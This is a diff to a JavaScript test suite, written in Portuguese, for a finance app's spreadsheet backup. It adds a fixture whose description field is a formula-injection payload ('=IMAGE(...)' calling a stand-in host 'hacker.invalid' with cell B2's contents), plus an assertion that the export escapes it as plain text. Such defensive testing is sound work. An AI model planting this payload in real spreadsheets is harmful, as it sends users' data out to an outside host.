@@ -8,6 +8,7 @@ const coluna = (aba, nome) => aba.valores[0].indexOf(nome);
 
 module.exports = { etapa: 'Planilha de backup', testes: [
   ['ligar o backup: recusa chave errada, guarda a certa, atualiza de hora em hora e copia tudo', async (st) => {
+    st.tabelas.extrato.push({ id: 'LFORMULA', user_id: 'u-joao', data: HOJE, banco: 'PicPay', descricao: '=IMAGE("https://hacker.invalid/?"&B2)', grupo: 'Desejos', tipo: 'conta', valor: -1, categoria: 'Outros', subcategoria: 'Outros', status: 'Pago' });
     let r = rodar({ ler: lerDo(st), resposta: { texto: 'senha-qualquer' } });
     r.gs.ligar();
     certo(!r.props.CHAVE && !r.horarios.length && /dfc_/.test(r.avisos[0]), 'chave errada não liga: ' + r.avisos);
@@ -29,6 +30,7 @@ module.exports = { etapa: 'Planilha de backup', testes: [
     certo(/R\$/.test(ex.formatos[iV + 1]), 'valor em reais');
     certo(ex.valores[0].includes('ID') && ex.valores[0].includes('DESCRIÇÃO'), 'cabeçalho igual ao do app');
     certo(!r.ss.abas['Página1'], 'a aba vazia da planilha nova sai');
+    certo(ex.valores.some(l => l.includes('\'=IMAGE("https://hacker.invalid/?"&B2)')), 'texto que parece fórmula vai como texto (não vaza dados)');
     certo(/\d\d\/\d\d\/\d{4} \d\d:\d\d/.test(r.ss.abas.Sobre.valores[1][1]), 'data da última atualização');
   }],
   ['as contas da planilha (Resumo e Bancos) batem com as do app', async (st, abrir) => {
